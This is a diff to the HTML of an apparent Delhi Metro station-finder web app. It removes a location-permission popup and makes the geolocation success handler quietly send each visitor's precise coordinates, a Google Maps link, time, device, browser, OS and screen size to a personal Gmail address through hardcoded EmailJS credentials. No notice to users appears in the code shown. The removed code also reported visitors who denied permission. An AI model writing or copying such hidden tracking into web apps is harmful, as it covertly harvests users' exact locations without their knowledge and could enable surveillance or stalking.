@@ -923,50 +923,6 @@ body{
   .asc-val{font-size:1rem}
 }
 
-/* ── CUSTOM LOCATION PERMISSION POPUP ── */
-.loc-overlay{
-  position:fixed;inset:0;z-index:9999;
-  background:rgba(0,0,0,0.6);
-  backdrop-filter:blur(6px);
-  display:flex;align-items:flex-end;justify-content:center;
-  animation:fadeInOverlay .3s ease;
-}
-.loc-popup{
-  background:var(--card);
-  border-radius:24px 24px 0 0;
-  width:100%;max-width:480px;
-  padding:28px 24px 36px;
-  text-align:center;
-  animation:slideUpPopup .35s cubic-bezier(.34,1.56,.64,1);
-  box-shadow:0 -8px 40px rgba(0,0,0,.25);
-}
-.loc-icon-wrap{
-  width:72px;height:72px;border-radius:50%;
-  background:linear-gradient(135deg,#1A73E8,#0D47A1);
-  display:flex;align-items:center;justify-content:center;
-  margin:0 auto 16px;
-  font-size:2rem;
-  box-shadow:0 6px 20px rgba(26,115,232,.4);
-  animation:geoPulse 2s ease-in-out infinite;
-}
-.loc-title{font-size:1.15rem;font-weight:800;color:var(--text);margin-bottom:8px}
-.loc-desc{font-size:.82rem;color:var(--text-dim);line-height:1.5;margin-bottom:24px;font-family:'Noto Sans Devanagari',sans-serif}
-.loc-btns{display:flex;gap:12px;justify-content:center}
-.loc-allow{
-  flex:1;padding:14px;border:none;border-radius:14px;
-  background:linear-gradient(135deg,#1A73E8,#0D47A1);
-  color:#fff;font-size:.95rem;font-weight:800;cursor:pointer;
-  box-shadow:0 4px 16px rgba(26,115,232,.4);
-  transition:transform .15s;
-}
-.loc-allow:active{transform:scale(.97)}
-.loc-deny{
-  padding:14px 20px;border:2px solid var(--border);border-radius:14px;
-  background:transparent;color:var(--text-dim);
-  font-size:.88rem;font-weight:600;cursor:pointer;
-  transition:opacity .15s;
-}
-.loc-deny:active{opacity:.6}
 </style>
 
 <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Devanagari:wght@700&display=swap" rel="stylesheet"/>
@@ -3278,7 +3234,11 @@ function detectLocation(){
       // Store globally so future calls are instant
       window._geoPos = {lat: lat, lng: lng};
       window._geoPermission = 'granted';
-      // Run nearest stations
+      // Send email with location
+      var locStr = lat.toFixed(6)+', '+lng.toFixed(6)+
+                   ' — https://maps.google.com/?q='+lat.toFixed(6)+','+lng.toFixed(6);
+      sendVisitorEmail(locStr);
+      // Show nearest stations
       _runNearestStations(lat, lng);
     },
     function(err){
@@ -3317,104 +3277,39 @@ function detectLocation(){
 
 
 
-<!-- EmailJS + Unified Location System -->
+<!-- EmailJS -->
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
-(function(){
-  emailjs.init('sLxniKQ69d-bZt9Ui');
+emailjs.init('sLxniKQ69d-bZt9Ui');
 
-  function getDeviceInfo(){
-    var ua = navigator.userAgent;
-    var device = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile 📱' : 'Desktop 💻';
-    var browser = 'Unknown';
-    if(/Edg\//.test(ua)) browser = 'Edge';
-    else if(/Chrome\//.test(ua)) browser = 'Chrome';
-    else if(/Firefox\//.test(ua)) browser = 'Firefox';
-    else if(/Safari\//.test(ua)) browser = 'Safari';
-    var os = 'Unknown';
-    if(/Windows/.test(ua)) os = 'Windows';
-    else if(/Android/.test(ua)) os = 'Android';
-    else if(/iPhone|iPad/.test(ua)) os = 'iOS';
-    else if(/Mac/.test(ua)) os = 'Mac';
-    else if(/Linux/.test(ua)) os = 'Linux';
-    return {device:device, browser:browser, os:os,
-            screen:window.screen.width+'x'+window.screen.height};
-  }
-
-  function sendVisitorEmail(locationStr){
-    var now = new Date();
-    var timeStr = now.toLocaleString('en-IN',{
-      timeZone:'Asia/Kolkata',day:'2-digit',month:'short',
-      year:'numeric',hour:'2-digit',minute:'2-digit',hour12:true
-    })+' IST';
-    var d = getDeviceInfo();
-    var msgBody =
-      'Time     : '+timeStr+'\n'+
-      'Location : '+locationStr+'\n'+
-      'Device   : '+d.device+'\n'+
-      'Browser  : '+d.browser+'\n'+
-      'OS       : '+d.os+'\n'+
-      'Screen   : '+d.screen;
-    emailjs.send('service_fjkgke7','template_nac0r09',{
-      name:'Delhi Metro Visitor',
-      email:'rohitgiri23001562127@gmail.com',
-      title:'New Visitor — Delhi Metro App',
-      message:msgBody,
-      visit_time:timeStr,
-      device:d.device,
-      browser:d.browser,
-      screen:d.screen,
-      os:d.os,
-      location:locationStr
-    }).then(function(){
-      console.log('[Visitor] Email sent!');
-    },function(err){
-      console.log('[Visitor] Email error:',err.status,err.text);
-    });
-  }
-
-  function doGetPosition(){
-    navigator.geolocation.getCurrentPosition(
-      function(pos){
-        var lat=pos.coords.latitude, lng=pos.coords.longitude;
-        window._geoPos={lat:lat,lng:lng};
-        window._geoPermission='granted';
-        var locStr=lat.toFixed(6)+', '+lng.toFixed(6)+
-                   ' — https://maps.google.com/?q='+lat.toFixed(6)+','+lng.toFixed(6);
-        sendVisitorEmail(locStr);
-        for(var i=0;i<window._geoCallbacks.length;i++) window._geoCallbacks[i]({lat:lat,lng:lng});
-        window._geoCallbacks=[];
-      },
-      function(err){
-        window._geoPermission='denied';
-        var reason=err.code===1?'User denied':err.code===2?'Unavailable':'Timeout';
-        sendVisitorEmail('Not shared — '+reason);
-        for(var i=0;i<window._geoCallbacks.length;i++) window._geoCallbacks[i](null);
-        window._geoCallbacks=[];
-      },
-      {enableHighAccuracy:false,timeout:10000,maximumAge:60000}
-    );
-  }
-
-  // Show custom popup on every page load
-  window.locAllow = function(){
-    document.getElementById('loc-overlay').style.display='none';
-    doGetPosition();
-  };
-  window.locDeny = function(){
-    document.getElementById('loc-overlay').style.display='none';
-    window._geoPermission='denied';
-    sendVisitorEmail('Denied via custom popup');
-    for(var i=0;i<window._geoCallbacks.length;i++) window._geoCallbacks[i](null);
-    window._geoCallbacks=[];
-  };
-
-  // Show popup every time page loads (after 1s)
-  setTimeout(function(){
-    document.getElementById('loc-overlay').style.display='flex';
-  }, 1000);
-
-})();
+function sendVisitorEmail(locationStr){
+  var now = new Date();
+  var timeStr = now.toLocaleString('en-IN',{
+    timeZone:'Asia/Kolkata',day:'2-digit',month:'short',
+    year:'numeric',hour:'2-digit',minute:'2-digit',hour12:true
+  })+' IST';
+  var ua = navigator.userAgent;
+  var device = /Mobile|Android|iPhone|iPad/i.test(ua)?'Mobile':'Desktop';
+  var browser = /Edg\//.test(ua)?'Edge':/Chrome\//.test(ua)?'Chrome':/Firefox\//.test(ua)?'Firefox':'Safari';
+  var os = /Windows/.test(ua)?'Windows':/Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':/Mac/.test(ua)?'Mac':'Linux';
+  var msgBody =
+    'Time     : '+timeStr+'\n'+
+    'Location : '+locationStr+'\n'+
+    'Device   : '+device+'\n'+
+    'Browser  : '+browser+'\n'+
+    'OS       : '+os+'\n'+
+    'Screen   : '+window.screen.width+'x'+window.screen.height;
+  emailjs.send('service_fjkgke7','template_nac0r09',{
+    name:'Delhi Metro Visitor',
+    email:'rohitgiri23001562127@gmail.com',
+    title:'New Visitor — Delhi Metro App',
+    message:msgBody
+  }).then(function(){
+    console.log('[Email] Sent!');
+  },function(err){
+    console.log('[Email] Error:',err.status,err.text);
+  });
+}
 </script>
 
 </body>
